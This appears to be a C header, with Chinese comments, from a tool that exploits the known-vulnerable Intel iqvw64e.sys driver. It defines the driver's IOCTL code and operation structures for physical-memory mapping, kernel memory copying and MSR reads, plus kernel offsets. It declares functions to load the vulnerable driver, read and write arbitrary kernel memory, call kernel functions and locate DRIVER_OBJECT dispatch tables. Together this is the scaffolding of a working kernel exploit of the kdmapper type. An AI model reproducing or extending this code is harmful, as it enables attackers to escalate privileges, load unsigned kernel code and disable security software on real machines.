#pragma once

#include <windows.h>
#include <winternl.h>

/* ------------------------------------------------------------------ */
/*  iqvw64e.sys 设备 / IOCTL 定义                                     */
/* ------------------------------------------------------------------ */

#define INTEL_DEVICE_NAME       L"\\\\.\\Nal"
#define INTEL_DRIVER_SVC_NAME   L"Nal"
#define INTEL_DRIVER_FILE_NAME  L"iqvw64e.sys"

/* iqvw64e.sys 唯一 IOCTL: CTL_CODE(0x8086, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS) */
#define INTEL_IOCTL             0x80862007

/* IOCTL 操作码 (Case) */
#define INTEL_OP_MAP_IO_SPACE       0x19
#define INTEL_OP_UNMAP_IO_SPACE     0x1A
#define INTEL_OP_GET_PHYS_ADDR      0x25
#define INTEL_OP_READ_MSR           0x33
#define INTEL_OP_MEMCOPY            0x30

/* IOCTL 输入/输出缓冲区 */
#pragma pack(push, 1)

typedef struct _INTEL_MAP_IO_SPACE {
    ULONG64 Op;                     /* = INTEL_OP_MAP_IO_SPACE          */
    ULONG64 PhysAddr;               /* 输入：物理地址                   */
    ULONG64 Size;                   /* 输入：映射大小                   */
    ULONG64 OutPtr;                 /* 输出：用户态虚拟地址             */
} INTEL_MAP_IO_SPACE;

typedef struct _INTEL_UNMAP_IO_SPACE {
    ULONG64 Op;                     /* = INTEL_OP_UNMAP_IO_SPACE        */
    ULONG64 Reserved;
    ULONG64 VirtAddr;               /* 输入：之前映射的地址             */
    ULONG64 Reserved2;
    ULONG64 Size;                   /* 输入：大小                       */
} INTEL_UNMAP_IO_SPACE;

typedef struct _INTEL_GET_PHYS_ADDR {
    ULONG64 Op;                     /* = INTEL_OP_GET_PHYS_ADDR         */
    ULONG64 Reserved;
    ULONG64 ReturnPhysAddr;         /* 输出：物理地址                   */
    ULONG64 VirtAddr;               /* 输入：内核虚拟地址               */
} INTEL_GET_PHYS_ADDR;

typedef struct _INTEL_MEMCOPY {
    ULONG64 Op;                     /* = INTEL_OP_MEMCOPY               */
    ULONG64 Reserved;
    ULONG64 Dst;                    /* 内核目标地址                     */
    ULONG64 Src;                    /* 内核源地址                       */
    ULONG64 Size;                   /* 字节数                           */
} INTEL_MEMCOPY;

typedef struct _INTEL_READ_MSR {
    ULONG64 Op;                     /* = INTEL_OP_READ_MSR              */
    ULONG64 Reserved;
    ULONG64 Value;                  /* 输出：MSR 值                     */
    ULONG64 MsrIndex;              /* 输入：MSR 索引                   */
} INTEL_READ_MSR;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  内核系统信息（NtQuerySystemInformation 相关）                     */
/* ------------------------------------------------------------------ */

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    UCHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

#define SystemModuleInformation         11
#define SystemHandleInformationEx       0x40

/* DRIVER_OBJECT 偏移 (Windows 10/11 x64) */
#define DRIVER_OBJECT_MJ_OFFSET         0x70
#define IRP_MJ_CREATE_INDEX             0
#define IRP_MJ_DEVICE_CONTROL_INDEX     14

/* FILE_OBJECT / DEVICE_OBJECT 偏移 */
#define FILE_OBJECT_DEVICE_OFFSET       0x08
#define DEVICE_OBJECT_DRIVER_OFFSET     0x08

/* ------------------------------------------------------------------ */
/*  Native API 类型定义                                               */
/* ------------------------------------------------------------------ */

typedef NTSTATUS(NTAPI *PFN_NtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS(NTAPI *PFN_NtUnloadDriver)(PUNICODE_STRING);
typedef NTSTATUS(NTAPI *PFN_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef VOID(NTAPI *PFN_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI *PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

/* ------------------------------------------------------------------ */
/*  函数声明                                                          */
/* ------------------------------------------------------------------ */

/* 漏洞驱动管理 */
BOOL IntelLoadDriver(LPCWSTR DriverPath);
BOOL IntelUnloadDriver(void);
BOOL IntelOpenDevice(void);
void IntelCloseDevice(void);
HANDLE IntelGetDevice(void);

/* 物理/虚拟内存操作 */
ULONG64 IntelMapIoSpace(ULONG64 PhysAddr, ULONG Size);
BOOL    IntelUnmapIoSpace(ULONG64 Addr, ULONG Size);
ULONG64 IntelGetPhysAddr(ULONG64 VirtAddr);
BOOL    IntelMemCopy(ULONG64 Dst, ULONG64 Src, ULONG64 Size);

/* 内核虚拟内存读写 */
BOOL IntelReadKernel(ULONG64 KernelAddr, PVOID Buffer, ULONG Size);
BOOL IntelWriteKernel(ULONG64 KernelAddr, PVOID Buffer, ULONG Size);

/* 内核模块查询 */
ULONG64 IntelGetKernelModuleBase(LPCSTR ModuleName, PULONG OutSize);
ULONG64 IntelGetKernelExport(ULONG64 ModuleBase, LPCSTR ExportName);

/* 调用内核函数 (最多 4 个参数) */
BOOL IntelCallKernel(ULONG64 FuncAddr, ULONG64 Arg1, ULONG64 Arg2,
                     ULONG64 Arg3, ULONG64 Arg4, PULONG64 RetVal);

/* DRIVER_OBJECT 查找 */
ULONG64 IntelFindDriverObject(void);
